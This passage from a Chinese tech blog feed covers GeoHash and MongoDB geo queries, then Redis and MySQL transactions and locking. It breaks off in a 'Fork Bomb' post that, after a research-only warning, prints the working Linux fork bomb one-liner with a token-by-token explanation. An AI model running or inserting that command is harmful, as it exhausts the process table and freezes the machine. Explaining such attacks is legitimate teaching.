class="string">''</span>;</span><br><span class="line">        <span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; strlen($s); $i += <span class="number">2</span>) &#123;</span><br><span class="line">            $lng .= $s[$i];</span><br><span class="line">            $lat .= $s[$i + <span class="number">1</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> [$lat, $lng];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 二进制转换成十进制经纬度</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> float $s 二进制经纬度</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> float $l 左阈值</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> float $r 右阈值</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> float|int|string</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">bit2dec</span><span class="params">($s, $l, $r)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $k = <span class="string">''</span>;</span><br><span class="line">        $mid = ($l + $r) / <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; strlen($s); $i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> ($s[$i]) &#123;</span><br><span class="line">                $l = $mid;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $r = $mid;</span><br><span class="line">            &#125;</span><br><span class="line">            $mid = ($l + $r) / <span class="number">2</span>;</span><br><span class="line">            $k = $mid;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $k;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Testing</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">$lat = <span class="number">30.63578</span>;</span><br><span class="line">$lng = <span class="number">104.031601</span>;</span><br><span class="line">var_dump(<span class="string">"初始值: $lat,$lng"</span>);</span><br><span class="line">var_dump(<span class="string">"编码后: "</span> . ($s = GeoHash::encode($lat, $lng)));</span><br><span class="line">var_dump(<span class="string">"解码后: "</span> . (implode(<span class="string">','</span>, GeoHash::decode($s))));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 输出</span></span><br><span class="line"><span class="comment">string(30) "初始值: 30.63578,104.031601"</span></span><br><span class="line"><span class="comment">string(27) "编码后: wm3yr31d252414ux"</span></span><br><span class="line"><span class="comment">string(41) "解码后: 30.63577999993,104.03160100012"</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><h3 id="方案二：-MongoDB"><a href="#方案二：-MongoDB" class="headerlink" title="方案二： MongoDB"></a>方案二： MongoDB</h3><p>MongoDB原生支持地理位置索引，可以直接用于位置距离计算和查询。</p><p>另外，它也是如今最流行的NoSQL数据库之一，除了能够很好地支持地理位置计算之外，还拥有诸如面向集合存储、模式自由、高性能、支持复杂查询、支持完全索引等等特性。查询结果默认将会由近到远排序，而且查询结果也包含目标点对象、距离目标点的距离等信息。由于geoNear是MongoDB原生支持的查询函数，所以性能上也做到了高度的优化，完全可以应付生产环境的压力。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 插入数据</span></span><br><span class="line">db.location.insert(&#123;</span><br><span class="line">      "xian":"成都",</span><br><span class="line">      "sheng":"四川",</span><br><span class="line">      "center":&#123; "type":"Point","coordinates":[104.068433,30.659673]&#125;</span><br><span class="line">&#125;);</span><br><span class="line">db.location.insert(&#123;</span><br><span class="line">      "xian":"绵阳",</span><br><span class="line">      "sheng":"四川",</span><br><span class="line">      "center":&#123; "type":"Point","coordinates":[104.680961,31.473909]&#125;</span><br><span class="line">&#125;);</span><br><span class="line">db.location.insert(&#123;</span><br><span class="line">      "xian":"泸州",</span><br><span class="line">      "sheng":"四川",</span><br><span class="line">      "center":&#123; "type":"Point","coordinates":[105.450251,28.876403]&#125;</span><br><span class="line">&#125;);</span><br><span class="line">db.location.insert(&#123;</span><br><span class="line">      "xian":"德阳",</span><br><span class="line">      "sheng":"四川",</span><br><span class="line">      "center":&#123; "type":"Point","coordinates":[104.408441,31.134847]&#125;</span><br><span class="line">&#125;);</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 创建 2dsphere索引</span></span><br><span class="line">db.location.createIndex(&#123;"center":"2dsphere"&#125;); # 或 db.location.ensureIndex( &#123; center : "2dsphere" &#125; )</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查询: 这种方法可以返回的由近及远的点，但是不能获取距离，支持分页查询</span></span><br><span class="line">db.location.find(&#123;</span><br><span class="line">  center:&#123;</span><br><span class="line">     $near:&#123;</span><br><span class="line">       $geometry:&#123;</span><br><span class="line">          type:"Point",</span><br><span class="line">          coordinates:[106.644153,30.452034]</span><br><span class="line">       &#125;,</span><br><span class="line">       $maxDistance: 500000 </span><br><span class="line">     &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;).limit(3);</span><br><span class="line"><span class="comment">/** 查询结果</span></span><br><span class="line"><span class="comment">&#123; "_id" : ObjectId("5f1e4e971a9a5bb3e50e17d3"), "xian" : "泸州", "sheng" : "四川", "center" : &#123; "type" : "Point", "coordinates" : [ 105.450251, 28.876403 ] &#125; &#125;</span></span><br><span class="line"><span class="comment">&#123; "_id" : ObjectId("5f1e4e971a9a5bb3e50e17d2"), "xian" : "绵阳", "sheng" : "四川", "center" : &#123; "type" : "Point", "coordinates" : [ 104.680961, 31.473909 ] &#125; &#125;</span></span><br><span class="line"><span class="comment">&#123; "_id" : ObjectId("5f1e4e991a9a5bb3e50e17d4"), "xian" : "德阳", "sheng" : "四川", "center" : &#123; "type" : "Point", "coordinates" : [ 104.408441, 31.134847 ] &#125; &#125;</span></span><br><span class="line"><span class="comment">**/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#查询：这种方法更加灵活，可以返回距离，还可以指定查询条件等,但是不可以分页</span></span><br><span class="line"></span><br><span class="line">db.runCommand( &#123;</span><br><span class="line">   geoNear: "location" ,</span><br><span class="line">   near: &#123; </span><br><span class="line">      type: "Point" , </span><br><span class="line">      coordinates: [106.644153,30.452034]</span><br><span class="line">    &#125; ,</span><br><span class="line">   spherical: true,</span><br><span class="line">   limit:3</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">/** 查询结果</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">        "results" : [</span></span><br><span class="line"><span class="comment">                &#123;</span></span><br><span class="line"><span class="comment">                        "dis" : 209998.53583992278,// 距离查询点距离，单位：米</span></span><br><span class="line"><span class="comment">                        "obj" : &#123;</span></span><br><span class="line"><span class="comment">                                "_id" : ObjectId("5f1e4e971a9a5bb3e50e17d3"),</span></span><br><span class="line"><span class="comment">                                "xian" : "泸州",</span></span><br><span class="line"><span class="comment">                                "sheng" : "四川",</span></span><br><span class="line"><span class="comment">                                "center" : &#123;</span></span><br><span class="line"><span class="comment">                                        "type" : "Point",</span></span><br><span class="line"><span class="comment">                                        "coordinates" : [</span></span><br><span class="line"><span class="comment">                                                105.450251,</span></span><br><span class="line"><span class="comment">                                                28.876403</span></span><br><span class="line"><span class="comment">                                        ]</span></span><br><span class="line"><span class="comment">                                &#125;</span></span><br><span class="line"><span class="comment">                        &#125;</span></span><br><span class="line"><span class="comment">                &#125;,</span></span><br><span class="line"><span class="comment">                &#123;</span></span><br><span class="line"><span class="comment">                        "dis" : 219215.02401424237,</span></span><br><span class="line"><span class="comment">                        "obj" : &#123;</span></span><br><span class="line"><span class="comment">                                "_id" : ObjectId("5f1e4e971a9a5bb3e50e17d2"),</span></span><br><span class="line"><span class="comment">                                "xian" : "绵阳",</span></span><br><span class="line"><span class="comment">                                "sheng" : "四川",</span></span><br><span class="line"><span class="comment">                                "center" : &#123;</span></span><br><span class="line"><span class="comment">                                        "type" : "Point",</span></span><br><span class="line"><span class="comment">                                        "coordinates" : [</span></span><br><span class="line"><span class="comment">                                                104.680961,</span></span><br><span class="line"><span class="comment">                                                31.473909</span></span><br><span class="line"><span class="comment">                                        ]</span></span><br><span class="line"><span class="comment">                                &#125;</span></span><br><span class="line"><span class="comment">                        &#125;</span></span><br><span class="line"><span class="comment">                &#125;,</span></span><br><span class="line"><span class="comment">                &#123;</span></span><br><span class="line"><span class="comment">                        "dis" : 226894.19044046788,</span></span><br><span class="line"><span class="comment">                        "obj" : &#123;</span></span><br><span class="line"><span class="comment">                                "_id" : ObjectId("5f1e4e991a9a5bb3e50e17d4"),</span></span><br><span class="line"><span class="comment">                                "xian" : "德阳",</span></span><br><span class="line"><span class="comment">                                "sheng" : "四川",</span></span><br><span class="line"><span class="comment">                                "center" : &#123;</span></span><br><span class="line"><span class="comment">                                        "type" : "Point",</span></span><br><span class="line"><span class="comment">                                        "coordinates" : [</span></span><br><span class="line"><span class="comment">                                                104.408441,</span></span><br><span class="line"><span class="comment">                                                31.134847</span></span><br><span class="line"><span class="comment">                                        ]</span></span><br><span class="line"><span class="comment">                                &#125;</span></span><br><span class="line"><span class="comment">                        &#125;</span></span><br><span class="line"><span class="comment">                &#125;</span></span><br><span class="line"><span class="comment">        ],</span></span><br><span class="line"><span class="comment">        "stats" : &#123;</span></span><br><span class="line"><span class="comment">                "nscanned" : 5,</span></span><br><span class="line"><span class="comment">                "objectsLoaded" : 4,</span></span><br><span class="line"><span class="comment">                "avgDistance" : 218702.58343154436,</span></span><br><span class="line"><span class="comment">                "maxDistance" : 226894.19044046788,</span></span><br><span class="line"><span class="comment">                "time" : 0</span></span><br><span class="line"><span class="comment">        &#125;,</span></span><br><span class="line"><span class="comment">        "ok" : 1</span></span><br><span class="line"><span class="comment">&#125;**/</span></span><br></pre></td></tr></table></figure><h3 id="附录：两点距离算法"><a href="#附录：两点距离算法" class="headerlink" title="附录：两点距离算法"></a>附录：两点距离算法</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">  * 获取两点间的距离</span></span><br><span class="line"><span class="comment">  * <span class="doctag">@param</span> float $latitude1 纬度1</span></span><br><span class="line"><span class="comment">  * <span class="doctag">@param</span> float $longitude1 经度1</span></span><br><span class="line"><span class="comment">  * <span class="doctag">@param</span> float $latitude2 纬度2</span></span><br><span class="line"><span class="comment">  * <span class="doctag">@param</span> float $longitude2 经度2</span></span><br><span class="line"><span class="comment">  * <span class="doctag">@param</span> string $unit 单位: Km/Mi</span></span><br><span class="line"><span class="comment">  * <span class="doctag">@return</span> false|float</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">getDistanceBetweenPointsNew</span><span class="params">($latitude1, $longitude1, $latitude2, $longitude2, $unit = <span class="string">'Mi'</span>)</span></span></span><br><span class="line"><span class="function"> </span>&#123;</span><br><span class="line">     $theta = $longitude1 - $longitude2;</span><br><span class="line">     $distance = (sin(deg2rad($latitude1)) * sin(deg2rad($latitude2))) + (cos(deg2rad($latitude1)) * cos(deg2rad($latitude2)) * cos(deg2rad($theta)));</span><br><span class="line">     $distance = acos($distance);</span><br><span class="line">     $distance = rad2deg($distance);</span><br><span class="line">     $distance = $distance * <span class="number">60</span> * <span class="number">1.1515</span>;</span><br><span class="line">     <span class="keyword">switch</span> (strtolower($unit)) &#123;</span><br><span class="line">         <span class="keyword">case</span> <span class="string">'mi'</span>:</span><br><span class="line">             <span class="keyword">break</span>;</span><br><span class="line">         <span class="keyword">case</span> <span class="string">'km'</span> :</span><br><span class="line">             $distance = $distance * <span class="number">1.609344</span>;</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="keyword">return</span> (round($distance, <span class="number">2</span>));</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;方案一：-Mysql&quot;&gt;&lt;a href=&quot;#方案一：-Mysql&quot; class=&quot;headerlink&quot; title=&quot;方案一： Mysql&quot;&gt;&lt;/a&gt;方案一： Mysql&lt;/h3&gt;&lt;h4 id=&quot;通过球面两点距离公式&quot;&gt;&lt;a href=&quot;#通过球面两点距离公式&quot;
      
    
    </summary>
    
      <category term="数据库" scheme="http://ya2.top/categories/%E6%95%B0%E6%8D%AE%E5%BA%93/"/>
    
    
  </entry>
  
  <entry>
    <title>Redis Transactions</title>
    <link href="http://ya2.top/articles/Redis-Transactions/"/>
    <id>http://ya2.top/articles/Redis-Transactions/</id>
    <published>2020-07-21T14:33:44.000Z</published>
    <updated>2021-06-16T02:21:54.340Z</updated>
    
    <content type="html"><![CDATA[<h3 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h3><h4 id="事务"><a href="#事务" class="headerlink" title="事务"></a>事务</h4><p>所谓事务(Transaction) ，是指作为单个逻辑工作单元执行的一系列操作。事务必须满足ACID原则(原子性、一致性、隔离性和持久性)。简单来说事务其实就是打包一组操作（或者命令）作为一个整体，在事务处理时将顺序执行这些操作，并返回结果，如果其中任何一个环节出错，所有的操作将被回滚。</p><p>事务的四大特性(<strong>ACID</strong>)：</p><ul><li><strong>原子性</strong> 事务是数据库的逻辑工作单位，事务中包含的各操作要么都做，要么都不做 </li><li><strong>一致性</strong>  事务执行的结果必须是使数据库从一个一致性状态变到另一个一致性状态。因此当数据库只包含成功事务提交的结果时，就说数据库处于一致性状态。如果数据库系统 运行中发生故障，有些事务尚未完成就被迫中断，这些未完成事务对数据库所做的修改有一部分已写入物理数据库，这时数据库就处于一种不正确的状态，或者说是 不一致的状态。 </li><li><strong>隔离性</strong> 一个事务的执行不能其它事务干扰。即一个事务内部的操作及使用的数据对其它并发事务是隔离的，并发执行的各个事务之间不能互相干扰。 </li><li><strong>持续性</strong> 也称永久性，指一个事务一旦提交，它对数据库中的数据的改变就应该是永久性的。接下来的其它操作或故障不应该对其执行结果有任何影响。 </li></ul><h4 id="锁"><a href="#锁" class="headerlink" title="锁"></a>锁</h4><p>当程序中可能出现并发的情况时，就需要通过一定的手段来保证在并发情况下数据的准确性，通过这种手段保证了当前用户和其他用户一起操作时，所得到的结果和他单独操作时的结果是一样的。这种手段就叫做并发控制。并发控制的目的是保证一个用户的工作不会对另一个用户的工作产生不合理的影响。</p><p><img src="/articles/Redis-Transactions/1.jpg" alt></p><p>常说的并发控制，一般都和数据库管理系统（DBMS）有关。在DBMS中的并发控制的任务，是确保在多个事务同时存取数据库中同一数据时，不破坏事务的隔离性和统一性以及数据库的统一性。</p><p><strong>锁（LOCKING）</strong>便是最常用的并发控制机构，是防止其他事务访问指定的资源控制、实现并发控制的一种主要手段。</p><p>实现并发控制的主要手段大致可以分为乐观并发控制和悲观并发控制两种。</p><h5 id="悲观锁-Pessimistic-Lock"><a href="#悲观锁-Pessimistic-Lock" class="headerlink" title="悲观锁(Pessimistic Lock)"></a>悲观锁(Pessimistic Lock)</h5><p>当要对数据库中的一条数据进行修改的时候，为了避免同时被其他人修改，最好的办法就是直接对该数据进行加锁以防止并发。这种借助数据库锁机制，在修改数据之前先锁定，再修改的方式被称之为悲观并发控制【又名“悲观锁”，Pessimistic Concurrency Control，缩写“PCC”】。悲观锁有两种模式：</p><ul><li><p>共享锁【Shared lock】又称为读锁，简称S锁。顾名思义，共享锁就是多个事务对于同一数据可以共享一把锁，都能访问到数据，但是只能读不能修改。</p></li><li><p>排他锁【Exclusive lock】又称为写锁，简称X锁。顾名思义，排他锁就是不能与其他锁并存，如果一个事务获取了一个数据行的排他锁，其他事务就不能再获取该行的其他锁，包括共享锁和排他锁，但是获取排他锁的事务是可以对数据行读取和修改。</p></li></ul><p>悲观并发控制实际上是“先取锁再访问”的保守策略，为数据处理的安全提供了保证。</p><p><img src="/articles/Redis-Transactions/2.jpg" alt="悲观锁"></p><p>但是在效率方面，处理加锁的机制会让数据库产生额外的开销，还有增加产生死锁的机会。另外还会降低并行性，一个事务如果锁定了某行数据，其他事务就必须等待该事务处理完才可以处理那行数据。</p><p>举例(MySql-Innodb)：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">//0.开启事务</span><br><span class="line"><span class="keyword">begin</span></span><br><span class="line">//<span class="number">1.</span>查询商品库存信息</span><br><span class="line"><span class="keyword">select</span> quantity <span class="keyword">from</span> items <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span> <span class="keyword">for</span> <span class="keyword">update</span>;</span><br><span class="line">//2.修改库存</span><br><span class="line"><span class="keyword">update</span> item <span class="keyword">set</span> quantity=<span class="number">2</span> <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span>;</span><br><span class="line">//3.提交事务</span><br><span class="line"><span class="keyword">commit</span>; </span><br><span class="line"></span><br><span class="line">// 以上，在对id = 1的记录修改前，先通过for <span class="keyword">update</span>的方式进行加锁，然后再进行修改</span><br></pre></td></tr></table></figure><blockquote><p>上面提到，使用select…for update会把数据给锁住，不过需要注意一些锁的级别，MySQL InnoDB默认行级锁。行级锁都是基于索引的，如果一条SQL语句用不到索引是不会使用行级锁的，会使用表级锁把整张表锁住，这点需要注意</p></blockquote><h5 id="乐观锁-Optimistic-Locking"><a href="#乐观锁-Optimistic-Locking" class="headerlink" title="乐观锁(Optimistic Locking)"></a>乐观锁(Optimistic Locking)</h5><p>乐观锁是相对悲观锁而言的，乐观锁假设数据一般情况下不会造成冲突，所以在数据进行提交更新的时候，才会正式对数据的冲突与否进行检测，如果发现冲突了，则返回给用户错误的信息，让用户决定如何去做。</p><p>相对于悲观锁，在对数据库进行处理的时候，乐观锁并不会使用数据库提供的锁机制。一般的实现乐观锁的方式就是记录数据版本。</p><p><img src="/articles/Redis-Transactions/3.jpg" alt="乐观锁"></p><p>乐观并发控制相信事务之间的数据竞争(data race)的概率是比较小的，因此尽可能直接做下去，直到提交的时候才去锁定，所以不会产生任何锁和死锁。</p><p>示例(MySql-Innodb):</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">//查询商品库存信息，quantity = 3</span><br><span class="line"><span class="keyword">select</span> quantity <span class="keyword">from</span> items <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span>;</span><br><span class="line">// 修改商品库存为2</span><br><span class="line"><span class="keyword">update</span> items <span class="keyword">set</span> quantity=<span class="number">2</span> <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span> <span class="keyword">and</span> quantity=<span class="number">3</span>;</span><br><span class="line"></span><br><span class="line">// 以上，在更新之前，先查询一下库存表中当前库存数(quantity)，然后在做<span class="keyword">update</span>的时候，以库存数作为一个修改条件。当提交更新的时候，判断数据库表对应记录的当前库存数与第一次取出来的库存数进行比对，如果数据库表当前库存数与第一次取出来的库存数相等，则予以更新，否则认为是过期数据。</span><br></pre></td></tr></table></figure><h3 id="Redis事务"><a href="#Redis事务" class="headerlink" title="Redis事务"></a>Redis事务</h3><p>在Redis中实现事务主要依靠一下5个命令来实现：</p><ul><li><strong>MULTI</strong> 标记一个事务块的开始。</li><li><strong>EXEC</strong>  执行所有事务块内的命令。</li><li><strong>DISCARD</strong> 取消事务，放弃执行事务块内的所有命令。</li><li><strong>WATCH key [key …]</strong> 监视一个(或多个) key ，如果在事务执行之前这个(或这些) key 被其他命令所改动，那么事务将被打断。</li><li><strong>UNWATCH</strong> 取消 WATCH 命令对所有 key 的监视。</li></ul><p>Redis事务从开始到结束通常会通过三个阶段: <strong>事务开始  -&gt; 命令入队 -&gt; 事务执行</strong></p><h4 id="开启事务"><a href="#开启事务" class="headerlink" title="开启事务"></a>开启事务</h4><p><img src="/articles/Redis-Transactions/3.png" alt></p><h4 id="放弃事务"><a href="#放弃事务" class="headerlink" title="放弃事务"></a>放弃事务</h4><p><img src="/articles/Redis-Transactions/4.png" alt></p><h4 id="编译时错误（入队前就能检测出来）"><a href="#编译时错误（入队前就能检测出来）" class="headerlink" title="编译时错误（入队前就能检测出来）"></a>编译时错误（入队前就能检测出来）</h4><p><img src="/articles/Redis-Transactions/5.png" alt></p><blockquote><p>从 Redis 2.6.5 开始，服务器会对命令入队失败的情况进行记录，并在客户端调用 EXEC 命令时，拒绝执行并自动放弃这个事务</p></blockquote><h4 id="运行时错误（入队前不能检测出来）"><a href="#运行时错误（入队前不能检测出来）" class="headerlink" title="运行时错误（入队前不能检测出来）"></a>运行时错误（入队前不能检测出来）</h4><p><img src="/articles/Redis-Transactions/6.png" alt></p><blockquote><p>即使事务中有某个/某些命令在执行时产生了错误， 事务中的其他命令仍然会继续执行</p></blockquote><h4 id="WATCH监控"><a href="#WATCH监控" class="headerlink" title="WATCH监控"></a>WATCH监控</h4><p><img src="/articles/Redis-Transactions/7.png" alt></p><blockquote><p>WATCH指令，类似乐观锁，事务提交时，如果Key的值已被别的客户端改变，整个事务队列都不会被执行 </p></blockquote><h4 id="应用"><a href="#应用" class="headerlink" title="应用"></a>应用</h4><p>服务器访问并发比较大，无效访问频繁，比如说频繁请求接口，爬虫频繁访问服务器，抢购瞬时请求过大，我们需要限流(对访问来源计数，超过设定次数，设置过期时间，提醒访问频繁，稍后再试)处理。 </p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">limits=500   <span class="comment">#设置1秒内限制次数50</span></span><br><span class="line">if EXISTS userid</span><br><span class="line">    return '访问频繁，锁定时间剩余（ttl userid）秒'</span><br><span class="line">if userid_count_time &gt; limits</span><br><span class="line">   exprice userid,3600</span><br><span class="line">   return '访问频繁，稍后再试'</span><br><span class="line">else </span><br><span class="line">   MUlTI</span><br><span class="line">   incr userid_count_time          <span class="comment"># 对用户每秒的请求进行原子递增计数</span></span><br><span class="line">   exprice userid_count_time , 60</span><br><span class="line">   EXEC</span><br><span class="line"></span><br><span class="line">//使用事务的目的是避免执行错误中断，userid_count_time持久化到磁盘，高并发下这个很有必要</span><br></pre></td></tr></table></figure><h3 id="Redis事务和Mysql事务区别"><a href="#Redis事务和Mysql事务区别" class="headerlink" title="Redis事务和Mysql事务区别"></a>Redis事务和Mysql事务区别</h3><table><thead><tr><th align="left"></th><th align="left">mysql</th><th align="left">redis</th></tr></thead><tbody><tr><td align="left">开启事务</td><td align="left">start transaction</td><td align="left">multi</td></tr><tr><td align="left">回滚事务</td><td align="left">rollback</td><td align="left">不能回滚，使用discard命令可以放弃事务队列</td></tr><tr><td align="left">提交事务</td><td align="left">commit, 即使遇到语法错误也会提交</td><td align="left">exec, 如果遇到语法错误会放弃事务中的sql</td></tr><tr><td align="left">悲观锁</td><td align="left">使用select … for update实现悲观锁</td><td align="left">无</td></tr><tr><td align="left">乐观锁</td><td align="left">通常使用version或时间戳来实现乐观锁</td><td align="left">使用watch监控对象变化来实现乐观锁</td></tr><tr><td align="left">原子性</td><td align="left">具备</td><td align="left">具备</td></tr><tr><td align="left">一致性</td><td align="left">具备</td><td align="left">具备</td></tr><tr><td align="left">隔离性</td><td align="left">具备</td><td align="left">具备</td></tr><tr><td align="left">持久性</td><td align="left">具备</td><td align="left">当redis服务器使用AOF持久化模式并appendfsync设置为always时具备</td></tr></tbody></table><p>了解更多：<a href="https://redis.io/topics/transactions" target="_blank" rel="noopener">https://redis.io/topics/transactions</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;基础知识&quot;&gt;&lt;a href=&quot;#基础知识&quot; class=&quot;headerlink&quot; title=&quot;基础知识&quot;&gt;&lt;/a&gt;基础知识&lt;/h3&gt;&lt;h4 id=&quot;事务&quot;&gt;&lt;a href=&quot;#事务&quot; class=&quot;headerlink&quot; title=&quot;事务&quot;&gt;&lt;/a&gt;事务&lt;/h
      
    
    </summary>
    
      <category term="数据库" scheme="http://ya2.top/categories/%E6%95%B0%E6%8D%AE%E5%BA%93/"/>
    
    
  </entry>
  
  <entry>
    <title>Fork Bomb</title>
    <link href="http://ya2.top/articles/Fork-Bomb/"/>
    <id>http://ya2.top/articles/Fork-Bomb/</id>
    <published>2020-07-20T16:28:08.000Z</published>
    <updated>2021-06-16T02:21:48.736Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p><code>警告</code><br>本文只做研究用途，切勿用作其他非法用途，可参考<a href="https://baike.baidu.com/item/破坏计算机信息系统罪/10459409" target="_blank" rel="noopener">破坏计算机信息系统罪</a>。 运行文中代码可能对你的计算机造成一定损害(卡死)，请慎重运行。</p></blockquote><p>Fork炸弹（fork bomb）在计算机领域中是一种利用系统调用fork（或其他等效的方式）进行的拒绝服务攻击(DOS)。fork炸弹以极快的速度创建大量进程（进程数呈以2为底数的指数增长趋势），并以此消耗系统分配予进程的可用空间使进程表饱和，而系统在进程表饱和后就无法运行新程序，除非进程表中的某一进程终止，它可以利用在windows/linux等系统。</p><h2 id="linux系统"><a href="#linux系统" class="headerlink" title="linux系统"></a>linux系统</h2><p><strong>POC</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">:()&#123; :|:&amp; &#125;;:</span><br></pre></td></tr></table></figure><p><strong>注解</strong></p><table><thead><tr><th align="left"></th><th align="left"></th></tr></thead><tbody><tr><td align="left"><code>:()</code></td><td align="left">定义函数,函数名为”:”,即每当输入”:”时就会自动调用{}内代码</td></tr><tr><td align="left"><code>{</code></td><td align="left">“:”函数起始字元</td></tr><tr><td align="left"><code>:</code></td><td align="left">用递归方式调用”:”函数本身</td></tr><tr><td align="left"><code>|</code></td><td align="left">用管道(pipe)将其输出引至…（因为有一个管道操作符，因此会生成一个新的进程）</td></tr><tr><td align="left"><code>:</code></td><td align="left">另一次递归调用的”:”函数 # 综上,”:</td></tr><tr><td align="left"><code>&amp;</code></td><td align="left">后台运行,以使最初的”:”函数被关闭后其所调用的两个”:”函数还能继续执行</td></tr><tr><td align="left"><code>}</code></td><td align="left">“:”函数終止字元</td></tr><tr><td 